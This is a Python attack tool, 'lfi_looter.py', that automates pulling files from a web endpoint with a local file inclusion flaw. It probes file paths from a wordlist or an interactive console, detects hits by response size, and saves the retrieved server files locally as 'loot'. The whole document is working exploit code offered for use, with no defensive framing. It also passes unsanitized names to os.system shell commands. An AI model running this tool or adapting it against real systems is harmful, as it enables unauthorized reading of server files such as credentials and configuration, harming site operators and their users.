#!/usr/bin/env python3

import argparse
import requests
from colorama import Fore, Back, Style, init
import os
import time

def display(args):
    banner = f"""
     _      ___    _     _                    _                
    ( )    (  _`\ (_)   ( )                  ( )_              
    | |    | (_(_)| |   | |       _      _   | ,_)   __   _ __ 
    | |  _ |  _)  | |   | |  _  /'_`\  /'_`\ | |   /'__`\( '__)
    | |_( )| |    | |   | |_( )( (_) )( (_) )| |_ (  ___/| |   
    (____/'(_)    (_)   (____/'`\___/'`\___/'`\__)`\____)(_)   


    tool::lfi_looter.py (v1.0)
    desc::automates the lfi data exfil process
    created_by::Ryan \"subflow\" Trowbridge
    github::https://github.com/subfl0w/
    target::{args.target}FUZZ
    wordlist::{args.wordlist}
    console::{args.console}
    output::{os.getcwd()}/{args.output}
    """
    print(Fore.CYAN + banner)
    time.sleep(1)
    print(Fore.RED + "    grabbing the duffel bags...\n")
    time.sleep(1)

def console(args):
    try:
        active = True
        print(Fore.YELLOW + "info::console initialized\n")
        r = requests.get(f"{args.target}/Does/Not/Exist")
        defaultSize = len(r.content)
        while active:
            i = input("file$_ ")
            r = requests.get(args.target + i)
            i_ = i.replace('/', '', 1)
            i_ = i_.replace('/', '.')
            if len(r.content) > defaultSize:
                print(Fore.GREEN + f"size::{len(r.content)}::file::{i}::status::LOOTED")
                if args.output:
                    if not os.path.exists(f"{args.output}"): 
                        os.system(f"mkdir {args.output}")
                        os.system(f"touch {args.output}/{i_}")

                with open(f"{args.output}/{i_}", 'w') as output:
                        output.writelines(r.text)
                
            else: print(Fore.RED + f"size::{len(r.content)}::file::{i}::status::EMPTY")

    except Exception as e:
        print(Fore.RED + f"error::{e}")
    except KeyboardInterrupt:
        exit()

def looter(args):
    try:
        #get non existent file and store size
        r = requests.get(f"{args.target}/Does/Not/Exist")
        defaultSize = len(r.content)
        #open wordlist
        with open(args.wordlist, 'r') as wordlist:
            #list to collect valid files (LOOT)
            loot = []
            #iterate through wordlist
            for line_number, file in enumerate(wordlist,start=1):
                #small delay
                time.sleep(0.01)
                r = requests.get(f"{args.target}{file.strip()}")
                #determine if file actually exists
                if len(r.content) > defaultSize:
                    print(Fore.GREEN + f"size::{len(r.content)}::file::{file.strip()}::status::LOOTED")
                    #replaces / with . to make exfil easy
                    name = file.strip()
                    fname = name.replace('/', '', 1)
                    fname = fname.replace('/', '.')
                    #append valid files
                    loot.append(name)

                    #exfil data
                    if args.output:
                        if not os.path.exists(f"{args.output}"): os.system(f"mkdir {args.output}")
                        os.system(f"touch {args.output}/{fname}")

                        with open(f"{args.output}/{fname}", 'w') as output:
                            output.writelines(r.text)
                #no loot :(
                else:
                    print(Fore.RED + f"size::{len(r.content)}::file::{file.strip()}::status::EMPTY")

            #display valid files at the end
            time.sleep(1)
            print(Fore.GREEN + '\nloot::')
            time.sleep(1)
            print(Fore.GREEN + '\n'.join(loot))
            #displays exfil info
            if args.output:
                print(Fore.GREEN + f'\nexfiled_to::{os.getcwd()}/{args.output}')       

    except Exception as e:
        print(f"error::{e}")
    except KeyboardInterrupt:
        exit()     

def main(args):
    #check if console is enabled if not, go to looter
    if args.console: console(args)
    if args.wordlist: looter(args)
    else: print(Fore.RED + "error::you must have a wordlist for the looter function")

if __name__ == '__main__':
    #take in args
    p = argparse.ArgumentParser()
    p.add_argument('-t', '--target', help='the vulnerable endpoint to loot::http://example.com/index.php?file=', required=True)
    p.add_argument('-c', '--console', action='store_true', help="console mode for manual looting")
    p.add_argument('-w', '--wordlist', help='wordlist to use')
    p.add_argument('-o', '--output', help='output directory to exfil files to', required=True)
    #init args
    args = p.parse_args()
    #init colorama
    init(autoreset=True)
    display(args)
    main(args)
